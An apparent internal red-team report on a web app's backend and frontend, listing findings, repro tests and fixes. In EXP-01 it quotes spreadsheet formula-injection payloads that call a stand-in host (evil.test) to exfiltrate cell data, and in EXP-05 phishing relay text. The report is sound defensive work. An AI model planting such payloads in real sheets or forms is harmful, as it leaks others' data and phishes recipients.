# Security findings — external-view backend

Red-team pass on branch `Vish-F26`. All testing was local only (FastAPI TestClient /
`USE_SAMPLE_DATA`, email `send()` stubbed). No traffic was sent to production, Render,
Google Sheets, or any email provider.

Repro for every item: `tests/test_exploits.py`. Not-yet-fixed items are
`xfail(strict=True)` there, so the suite is green now and the test turns into a loud
failure (xpass) the moment the exploit stops working.

Run: `GMAIL_USER= GMAIL_APP_PASSWORD= RESEND_API_KEY= BREVO_API_KEY= DATABASE_URL= .venv/bin/python -m pytest -q`
→ see the status table; open items are the strict xfails in `tests/test_exploits.py`.

| ID | Severity | Component | Status | Owner |
|----|----------|-----------|--------|-------|
| EXP-01 | High | `main.py` Sheets writes | Fixed, verified (`value_input_option="RAW"` + `_sheet_safe` apostrophe, `_sheet_unsafe` on read) | email-engineer |
| EXP-05 | High | `POST /requests` confirmation email | Fixed, verified (`_no_links`, fixed subject) | email-engineer |
| EXP-02 | Medium | `main.py` `rate_limit_post` | Fixed, verified (XFF read only when `TRUST_PROXY=1`; set it on Render) | email-engineer |
| EXP-03 | Medium | `main.py` `/inventory/availability` | Fixed, verified | email-engineer |
| EXP-06 | Medium | `email.py` global daily cap | Fixed, verified (submit budget shares) | email-engineer |
| EXP-04 | Low | `main.py` `_make_request_id` | Fixed, verified (`secrets.token_hex(3)`) | email-engineer |
| EXP-07 | Low | `email.py` per-address cap | Fixed, verified (`_address_key`) | email-engineer |
| EXP-10 | Low | `POST /requests` quantity not checked against stock | Accepted risk (lead decision: HQ reviews every request) | n/a |
| EXP-11 | Medium | `GET /requests?email=` lookup | Fixed, verified (20/min per IP, own bucket, keyed on `_client_ip`) | email-engineer |
| EXP-12 | Low | `vercel.json` security headers | Fixed, verified (deploy check: CSP `connect-src` must equal Vercel's `REACT_APP_API_URL`) | main |
| EXP-08 | Low | `my-dashboard/src/hooks.js` `#/sent/<id>` | Fixed, verified (`REQUEST_ID_RE`, no decode) | frontend-engineer |
| EXP-09 | Low | `my-dashboard/src/hooks.js` `parseHash` | Fixed, verified (no decode; top-level `ErrorBoundary` added) | frontend-engineer |
| EXP-13 | Medium | `productIcons/mapping.js` + `App.js` inventory cache | Fixed, verified (root: `Map` + `hasIcon`; hardening: label fallback, cache after enrich, v2 cache, drop on failure, ErrorBoundary clears) | icon-designer (mapping) / frontend-engineer (App) |

---

## EXP-01 — Google Sheets formula / CSV injection (High)

**Component:** `main.py` — `submit_org_request` (`POST /requests`, sheet mode) and
`submit_request` (`POST /api/requests`); both call `ws.append_rows(..., value_input_option="USER_ENTERED")`.

**Repro:** `tests/test_exploits.py::test_sheet_values_are_not_live_formulas`. `POST /requests`
with `org_name='=HYPERLINK("https://evil.test?"&A1,"x")'` and an item whose `item_name` is
`=IMPORTXML("https://evil.test","//x")` and `category` is `@SUM(1)`. The captured write shows
the raw strings handed to `append_rows` with `value_input_option="USER_ENTERED"`:

```
['REQ-...','=HYPERLINK("https://evil.test?"&A1,"x")','attacker@x.org','=IMPORTXML("https://evil.test","//x")','@SUM(1)',1,'Under Review',...]
```

**Impact:** Any field an anonymous requester controls (`org_name`, `item_name`, `category`;
plus `nametag`/`request_notes` on `/api/requests`) is stored as a live formula because
`USER_ENTERED` makes Sheets evaluate it. When an HQ operator opens the Requests tab:
- `=IMPORTXML(...)` / `=IMPORTDATA(...)` fire outbound requests to an attacker URL (SSRF-from-the-sheet, data exfiltration).
- `=HYPERLINK("https://evil.test?"&A1, "click")` concatenates adjacent cell values (other orgs'
  emails/requests) into a link that leaks them when clicked.
- `=`/`+`/`-`/`@` payloads are the classic CSV-injection set and also execute on CSV export.

HTML escaping in `app/services/email.py` does **not** cover this — it is a separate sink (the sheet).

**Suggested fix:** Neutralize formula triggers before writing. Prefix any cell whose string value
starts with `= + - @` (also tab / CR) with a leading apostrophe `'`, or write with
`value_input_option="RAW"` for user-supplied columns. A small helper applied in the `batch`
construction of both endpoints is enough:

```python
def _sheet_safe(v):
    s = str(v)
    return "'" + s if s[:1] in ("=", "+", "-", "@", "\t", "\r") else s
```

---

## EXP-02 — Rate-limit bypass via X-Forwarded-For spoofing (Medium)

**Component:** `main.py` — `rate_limit_post` (`ip = fwd.split(",")[-1].strip()`).

**Repro:** `tests/test_exploits.py::test_rate_limit_not_bypassable_by_spoofing_xff` (xfail) vs.
the control `test_rate_limit_works_for_a_fixed_client` (passes). 15 `POST /requests` each with a
different `X-Forwarded-For: 10.0.0.<i>` all return 200 (limit never triggers); with a fixed XFF
the 11th–15th correctly return 429.

**Impact:** The limiter keys on the **last** XFF hop, which is attacker-controlled whenever the
request does not pass through exactly one trusted, XFF-appending proxy — i.e. any direct/local
reach, a misconfiguration, or 0/2+ proxies. Rotating the header gives each request its own bucket,
so the 10/min anonymous-write limit (and the `/requests` + email fan-out behind it) is defeated.
Taking the last hop is only safe under the specific assumption of one appending proxy; it is not a
safe default.

**Suggested fix:** Default to the real socket peer `request.client.host` and only trust
`X-Forwarded-For` when a known-proxy setup is explicitly configured (e.g. a `TRUSTED_PROXIES`
count/env, picking the Nth-from-right hop). At minimum, document that the limiter is only correct
behind exactly one appending proxy.

---

## EXP-03 — Availability falsely "Limited" for unknown quantity (Medium)

**Component:** `main.py` — `/inventory/availability`, `_qty()` + the remaining/branding logic.

**Repro:** `tests/test_exploits.py::test_unknown_quantity_is_not_branded_limited` (xfail). Sample
inventory with `Gauze` Quantity `"10"`, `MysteryBox` Quantity `""`, `RangeItem` Quantity `"10-20"`
→ availability `{'Gauze': 'Available', 'MysteryBox': 'Limited', 'RangeItem': 'Limited'}`.

**Impact:** `_qty()` returns `None` for any blank or non-integer Quantity. With no open requests,
`remaining = qty = None`, and `remaining is None or remaining <= 5` brands the item **"Limited"
(Low Stock)**. So every item with a missing/odd quantity string shows as low stock regardless of
real availability — this is the reported "783 of 1137 items show Limited" problem. It misleads
clinics and understates availability.

**Suggested fix:** Separate "unknown quantity" from "low stock". When `_qty()` is `None` and there
are no open requests, treat the item as `Available`/`Unknown` (or a distinct `"Unknown"` status/tag)
rather than `Limited`. Only brand `Limited` when a numeric remaining count is actually `<= 5`.

---

## EXP-04 — Predictable / collision-prone request IDs (Low, documented)

**Component:** `main.py` — `_make_request_id()` → `REQ-<epoch_seconds>-<000..999>` (sheet/sample mode).

**Impact:** Only 1000 random suffixes per second. IDs are guessable, and two requests in the same
second collide ~1/1000; because status is matched by Request ID, a colliding PATCH would flip status
(and send the status email) for an unrelated org's request. Low severity: request IDs are not used
for authorization (`PATCH` still requires the HQ token, EXP checks confirm), and DB mode generates
IDs server-side. No strict test (collision is probabilistic, not a clean assertion).

**Suggested fix:** Use `uuid4` (or a DB sequence) for the suffix instead of `randint(0,999)`.

---

## EXP-05 — POST /requests relays attacker text to any address (High)

**Component:** `app/services/email.py` `send_org_confirmation` / `send_hq_alert`, queued by
`_queue_submit_emails` in `main.py`.

**Repro:** `tests/test_exploits.py::test_confirmation_does_not_relay_attacker_text` (xfail).
`POST /requests` with `org_email=victim@example.com`,
`org_name="ACTION REQUIRED: your access expires today, verify at https://evil.test/login"` and
`item_name="Re-verify at www.evil.test/b4p"` → a "Blueprints HQ"-branded confirmation goes to the
victim containing `Hi ACTION REQUIRED: ... https://evil.test/login,` in both the HTML and the text
part (mail clients auto-link bare URLs, so HTML escaping does not help). The HQ alert subject becomes
`New supply request from ACTION REQUIRED: ... https://evil.test/login`.

**Impact:** Anyone can make our sending domain deliver attacker-written, link-bearing mail to any
address (the classic contact-form relay). The caps bound the volume (≈3/hour/address, 200/day
total), but each message is still phishing under our brand. Reports of it can get the
Resend/Brevo account suspended and hurt domain reputation. `item_name` is free text that is not
checked against inventory, so it carries the payload too. The display-name and Reply-To tricks are
**not** possible (see below).

**Suggested fix (cheapest first):** (1) The confirmation should not echo attacker text. Use "Hi
there," and list only item names that match an inventory row (reject or drop unknown names on
`POST /requests`). Keep `org_name` in the HQ alert *body* (escaped) but put the request ID in its
subject, not `org_name`. (2) Optionally strip/neutralize URLs in `org_name` at validation.

## EXP-06 — Anonymous traffic exhausts the global daily cap and blocks all mail (Medium)

**Component:** `app/services/email.py` `send()` → `_under_daily_limit()`.

**Repro:** `tests/test_exploits.py::test_anonymous_traffic_cannot_block_status_emails` (xfail,
with `EMAIL_DAILY_LIMIT=20`). Ten junk submissions (2 mails each) use up the budget. HQ then
approves a real clinic's request (`PATCH .../status` with the HQ token) and **no status email is
sent**. In a probe with the default 200: after 100 junk requests a new legitimate confirmation was
also dropped.

**Impact:** Every submission spends 2 units of the shared 200/day budget, so 100 anonymous requests
silence all mail for 24h: confirmations, HQ alerts, and HQ-triggered Approved/Shipped notices.
At 10/min per IP that takes one IP about 10 minutes. The cap reset on restart does not help, since
an attacker can simply repeat the flood.

**Suggested fix:** Spend the cap only on anonymous-triggered mail. Give confirmations their own
budget, and exempt status emails (HQ-authenticated) from it, or give them a separate, higher budget.
HQ alerts can share the confirmation budget or be batched. Optionally log a warning once when the
confirmation budget runs out, so HQ notices the flood.

## EXP-07 — Per-address cap bypass via address aliases (Low)

**Component:** `app/services/email.py` `_confirmation_allowed()` (key = `address.strip().lower()`).

**Repro:** `tests/test_exploits.py::test_confirmation_cap_covers_address_aliases` (xfail). Sends to
`victim@gmail.com`, `victim+1@…`, `victim+2@…`, `v.ictim@…`, `vi.ctim@…`, `victim@gmail.com.` and
`victim@googlemail.com` produced 7 confirmations (cap 3), and all of them land in one inbox.

**Impact:** One victim can receive up to the global budget instead of 3/hour. Low on its own,
because EXP-06's cap bounds it, but it is the main way to aim EXP-05 at a single person.

**Suggested fix:** Normalize the key: lowercase, strip a trailing `.` from the domain, drop `+tag`
from the local part, and for `gmail.com`/`googlemail.com` remove dots and use a single domain.
Alternatively, cap per domain as well.

## EXP-10 — Requested quantity is not checked against stock (Low, accepted risk)

The client caps quantity at stock (`useCart.js` `capQuantity`), but `POST /requests` accepts 1–10000
per line regardless of stock. A direct POST can over-request, which brands the item "Requested" for
other clinics until HQ acts. **Accepted risk:** HQ reviews every request before anything ships
(lead decision, 2026-10-09). If availability manipulation becomes a problem, revisit it.

## EXP-11 — Request lookup by email is not rate-limited (Medium)

**Repro:** `tests/test_exploits.py::test_request_lookup_is_rate_limited` (xfail). 30 `GET /requests?email=`
lookups for different addresses from one client all return 200; only `POST /requests` is limited.

**Impact:** The lookup is the app's only access check: knowing a clinic's email is enough to read
that clinic's request history (item names, quantities, dates, status). Clinic contact addresses are
often public, and with no throttle an attacker can test unlimited candidates (`info@`, `admin@`, … per
clinic domain) and harvest every hit.

**Suggested fix (cheapest):** Put `Depends(rate_limit_post)` (or a separate, looser bucket of about 30/min)
on `GET /requests` when `email` is given. Long-term, send the clinic an unguessable lookup link by
email instead of filtering on the bare address.

## EXP-12 — No framing protection or CSP on the Vercel deploy (Low)

**Repro:** `tests/test_exploits.py::test_vercel_sets_frame_and_csp_headers` (xfail). `vercel.json` has no
`headers` block, so the deployed app sends no `X-Frame-Options`/`frame-ancestors` and no CSP.

**Impact:** Any site can frame the app and trick a clinic user into clicks (the org name and email are
remembered, and the hash route can open a specific item). Impact is limited, because every request goes
to HQ review. Without a CSP there is no second layer if an XSS ever appears.

**Suggested fix:** Add to `vercel.json`:
`"headers": [{"source": "/(.*)", "headers": [{"key": "Content-Security-Policy", "value": "default-src 'self';
img-src 'self' data: https://drive.google.com https://*.googleusercontent.com; connect-src 'self' <API origin>;
frame-ancestors 'none'; base-uri 'self'; form-action 'self'"}, {"key": "X-Frame-Options", "value": "DENY"},
{"key": "Referrer-Policy", "value": "no-referrer"}, {"key": "X-Content-Type-Options", "value": "nosniff"}]}]`.
Drive thumbnails redirect to `*.googleusercontent.com`, so that host must be allowed. Check that the CRA
build has no inline scripts (`INLINE_RUNTIME_CHUNK=false`) before shipping `script-src 'self'`.

**EXP-12 CSP compatibility (verified 2026-10-09):** everything the UI loads is allowed: the Google Fonts
stylesheet (`style-src`), font files (`font-src fonts.gstatic.com`), Drive thumbnails and their
`*.googleusercontent.com` redirect (`img-src`), the inline `data:` SVG in `styles.css` (`img-src data:`), and the
same-origin favicon/manifest/bundle. The production build has 1 external script, 0 inline scripts/styles, and 0
`.map` files. React `style={{…}}` props and the copy-fallback's `el.style` use the CSSOM, which `style-src` does not
block. `'unsafe-inline'` in `style-src` is therefore likely removable; verify in a browser before dropping it. **Lead decision:** keep `'unsafe-inline'` for now (low risk, not yet browser-tested).
Regression test: `test_csp_allows_everything_the_frontend_loads`.

**EXP-12 deploy check:** `connect-src` hardcodes `https://b4p-external-view-w26-backend.onrender.com`,
which appears nowhere else in the repo. If Vercel's `REACT_APP_API_URL` points anywhere else, the browser
blocks every API call and the production app shows only errors. Compare the two values in the Vercel
dashboard before deploying. I did not check this against production (out of scope). **Resolved:** the lead confirmed the live Vercel bundle uses exactly this URL.

## EXP-08 — Content spoofing via `#/sent/<text>` (Low)

**Repro:** `tests/test_exploits.py::test_sent_route_only_accepts_request_ids` (xfail; runs the real
`parseHash` from `hooks.js` in node). A crafted link `#/sent/<url-encoded sentence>` renders that
sentence as the "Request ID" under a "Request sent" heading on our domain.

**Impact:** Lets a crafted link show a fake message on our real site. It's text only (React
escapes it), so there's no XSS.

**Fix:** In `parseHash`, return the `sent` route only when the id matches the request-ID format
(e.g. `/^REQ-\d+-[0-9a-z]+$/i`); otherwise fall back to the catalog.

## EXP-09 — Malformed hash blanks the whole app (Low)

**Repro:** `tests/test_exploits.py::test_malformed_hash_does_not_crash_app` (xfail). `#/sent/%` makes
`decodeURIComponent` throw `URIError` inside `useHashRoute`'s `useState` initializer. `index.js`
has no error boundary, so React unmounts the app and leaves a blank page until the URL is
edited by hand.

**Fix:** Wrap the decode in try/catch (treat failure as the catalog route), and add a top-level
error boundary.

## EXP-13 — A "constructor"/"__proto__" subcategory permanently crashes the UI (Medium)

**Component:** `my-dashboard/src/productIcons/mapping.js` `matchItem()` (`SUBCATEGORIES[sub]` on a plain object),
plus `App.js` `useInventory()` (the cache is written before `enrich()`, and the cache is enriched inside a `useState` initializer).

**Repro:** `tests/test_exploits.py::test_prototype_named_subcategory_does_not_crash_ui` (xfail; runs the real
modules in Jest). Take an inventory row whose name matches no icon rule and whose Subcategory is `constructor` or `__proto__`,
in any case. `matchItem` hits the inherited `Object.prototype` property and returns `{via: 'subcategory'}` with no `label`, so
`enrich()` calls `undefined.toLowerCase()`. Mounting `<App/>` with that row in `b4p.inventory.v1` throws
`TypeError: Cannot read properties of undefined (reading 'toLowerCase')`.

**Impact:** One inventory cell takes the catalog down for everyone. The cell can come from an HQ edit to the sheet or DB, a
typo, or a tampered localStorage. On the first load, `writeInventoryCache(rows)` runs before `enrich(rows)`, so the bad rows get
cached, and then the UI shows an error state containing the raw TypeError text. On every later visit, `enrich(cached.supplies)`
throws during the first render. The ErrorBoundary shows, the refresh fetch never runs, and "Reload" re-reads the same cache. So
even after HQ fixes the cell, returning users stay locked out until they clear site data. Anonymous API users cannot trigger it,
because they cannot write inventory.

**Suggested fix:** (1) In `mapping.js`, use `Object.hasOwn(SUBCATEGORIES, sub)`, or build it with `Object.create(null)` or a `Map`.
Apply the same to `iconForSubcategory`. (2) In `App.js`, make it defensive: `const type = typeLabelFor(item) || 'Unsorted supplies'`,
write the cache only after `enrich()` succeeds, and wrap the cached `enrich` in try/catch so that on failure the app drops the
`b4p.inventory.v1` key and loads fresh. Optionally, the ErrorBoundary "Reload" can also clear that key.

**EXP-13 status:** fixed and hardened. Root fix (icon-designer): `SUBCATEGORIES` is a `Map`, and `hasIcon()` uses an own-property
check, so `constructor`/`__proto__`/`toString` resolve to the box fallback. Hardening (frontend-engineer): `enrich()` falls back to a
default label; the cache is written only after `enrich()` succeeds; the cache is versioned (`v: 2`) and shape-checked; a failing cached
enrich drops the cache and loads fresh; the ErrorBoundary clears the cache. Verified against the current `App.js` (`const fresh = enrich(rows)` runs before `writeInventoryCache`; the cached
enrich is wrapped in try/catch and calls `clearInventoryCache()`). An earlier note here, saying the hardening had not been applied,
came from reading the file before that change was on disk; it is withdrawn. The regression test
(`test_prototype_named_subcategory_does_not_crash_ui`, running real modules in Jest) checks four things: (1) the label is always a
string for `constructor`/`__proto__`/`Constructor`; (2) a poisoned v2 cache loads without the error page; (3) poisoned cache →
`enrich()` throws → cache cleared → the fresh fetch renders and is re-cached (with a module mock that throws only for the poisoned
row); (4) unusable *fresh* data is never written to the cache.

## Products / FEFO regression (2026-10-09)

The cart is keyed by `name|maker` product keys (≤400 chars, validated in `cleanLines`). Keys always contain `|`, so they can never be
`__proto__`/`constructor`, and the one plain-object map keyed by product (`TypeTable` `open`) is safe. Submit builds every POST line
from loaded inventory (`requestName` and the lot's own `sheet_row`); unknown cart ids are dropped, and more than 100 lots are blocked
client-side. Property fuzz of the real `groupProducts`/`allocateFefo` (2000 random products) showed: the allocated total always
equals the requested amount, the rows come only from the product's own lots, no expired lot is used, there is one line per row, and
each quantity is 1–10000. Mounting the real `<App/>` with tampered carts (bad JSON, nulls, `__proto__`, 401-character ids, object
names, a 1e9 quantity, negative max, legacy numeric ids, markup names) on `#/`, `#/slip` and `#/checkout` never crashes. Over-stock
requests remain the accepted EXP-10 risk, because overflow goes to one lot.


**Partial-submit fix (verified):** `handleSubmit` now blocks with an inline error if any cart line is missing from `productsById`,
so nothing partial is POSTed and the confirmation always matches what was sent. The maker merge (`makerKey`) is pure string
normalization, with no object-key lookups.
## Checked and NOT exploitable

- **Recipient injection via `org_email`.** The regex rejects `a@x.org,b@y.org`, `;` lists, display
  names (`Evil <a@x.org>`), CRLF/`Bcc:` and space-separated lists
  (`test_org_email_cannot_add_recipients`). `a@x.org,y.org` is accepted but contains a single `@`,
  so it cannot add a second recipient.
- **Reply-To / From spoofing.** Both come only from env (`EMAIL_FROM`, `EMAIL_REPLY_TO`/`HQ_EMAIL`).
  No request field reaches a header other than the subject, and the subject is collapsed to one line.
- **Cap races.** 40 threads calling `send_org_confirmation` for one address at once (20 trials)
  never exceeded 3; the GIL is enabled on this Python 3.14 build. If the deploy ever moves to a
  free-threaded build, re-check this, because the check-then-append is not locked.
- **XFF bypass, combined with the relay.** Fixed (EXP-02). Without `TRUST_PROXY=1`, spoofed XFF is
  ignored. With it set, the last hop is used, which is correct only if Render's proxy appends the
  client IP as the last hop. I could not verify that without production traffic (out of scope), so
  check it once in the Render logs. If `TRUST_PROXY` is *not* set on Render, every client shares
  the proxy's IP. That leaves one global 10/min bucket, so one attacker could block all submissions.
- **Sheets error text leaking to clients.** Fixed by email-engineer and verified through qa-tester's
  `tests/test_api_contract.py` `*_without_leak` tests: a Google 429 returns 503, other API errors return 502, and
  Google's text is never echoed.


- **HQ auth (`require_hq`)** — `hmac.compare_digest` (constant-time), empty/unset token → 403,
  wrong/short token → 401, header value coerced safely. Covered by `tests/test_security.py`.
- **Org filter IDOR (`GET /requests?email=`)** — exact case-insensitive match; substring (`email[1:]`),
  `%`, and empty/whitespace email do not leak other orgs (empty → HQ-token required). This is
  intentional no-auth-by-design; cheapest mitigation if desired: email an unguessable view link / OTP
  rather than filtering on the raw address. Covered by `test_security.py`.
- **Email injection** — subjects collapsed to one line (no CRLF), all user text HTML-escaped incl.
  `org_name`, `item_name`, `status`, review flags. Covered by `test_security.py`.
- **DB error leakage** — `_db_error` maps RaiseException/Check/DataError→400, Integrity→409,
  else→503, never echoing raw text. Covered by `test_security.py`.
- **Payload limits** — items 1–100, quantity 1–10000, name/email length + email regex enforced (422).
- **SQL injection (`app/db.py`)** — all queries parameterized (`%s` + psycopg); JSON via `Jsonb`. No
  string interpolation of user input into SQL. Not exploitable.
- **Frontend XSS:** no `dangerouslySetInnerHTML`/`innerHTML`/`eval`; images only from validated
  Drive IDs with `referrerPolicy="no-referrer"`; localStorage cart is shape-checked; checkout
  has an in-flight guard (no double-submit). `npm run build` (CI=true) compiles cleanly.
- **Frontend, deep pass (redesign):** all inventory and request fields render as React text; quantities
  are capped via `capQuantity` (and the input strips non-digits); the request lookup only sends a regex-valid
  address through `encodeURIComponent`; there are no `REACT_APP_*` secrets in the bundle. Informational: the
  CRA build ships a `.map` source map, and the dev server binds to all interfaces (LAN-visible during
  `npm start`). Neither matters if the repo is public, but set `GENERATE_SOURCEMAP=false` /
  `HOST=127.0.0.1` if it isn't.
- **CORS** — `ALLOWED_ORIGINS` is an explicit allowlist (default localhost), not `*`-with-credentials.

## Final regression pass (2026-10-09, after the frontend polish round)

Verdict: **safe to push.** `pytest -q` gives 245 passed, 0 xfailed. The `CI=true` build (deploy flags) compiles. The built
`index.html` has 0 inline scripts or styles, and there are no `.map` files. The built JS references only drive.google.com,
plus reactjs.org as error-message text. `src/` contains no HTML sinks (`dangerouslySetInnerHTML`, `innerHTML`, `eval`,
`javascript:`, `window.open`, `_blank`). No new origins: `evil.com` appears only in `inventory.test.js` negative cases, and the
vercel.app `og:image` is preview metadata, not something the page loads. localStorage: the cart is shape-checked, deduped and
capped (`cleanLines`), the org fields are type-checked, and the layout is allow-listed. Stored values only reach the DOM as text,
or through `thumbnailUrl`'s Drive-ID check. Hash-route fuzzing (`%`, encoded markup, `javascript:`, huge, negative and exponent
item ids, path tricks, 100k-character hash) never throws, and every result is the catalog, a valid REQ id, or a "not found" item.

## CSP guard after the McMaster-style redesign (2026-10-09)

The lead tightened the CSP to `img-src 'self' data:`, `font-src 'self'` and `style-src 'self' 'unsafe-inline'`, removing Drive photos and Google
Fonts. `test_csp_allows_everything_the_frontend_loads` now **derives** origins from the code instead of hard-coding them: it scans
`public/index.html` (skipping `<meta>`/og tags and comments) and non-test `src/*.js|*.css` (skipping comments and the `127.0.0.1` dev
fallback), and checks each origin against its directive (script, stylesheet, image/icon, `@font-face`, `@import`; JS URLs must be allowed by
`img-src` or `connect-src`). `test_removed_origins_stay_removed` bans Drive, googleusercontent and Google Fonts from the code and the CSP.
It was a strict xfail because the dead `driveFileId`/`thumbnailUrl` helpers (plus the `imageId` plumbing in `normalizeItem`/`useCart`)
remained in `src/inventory.js`. **Fixed, verified:** frontend-engineer deleted them, and the test now passes.
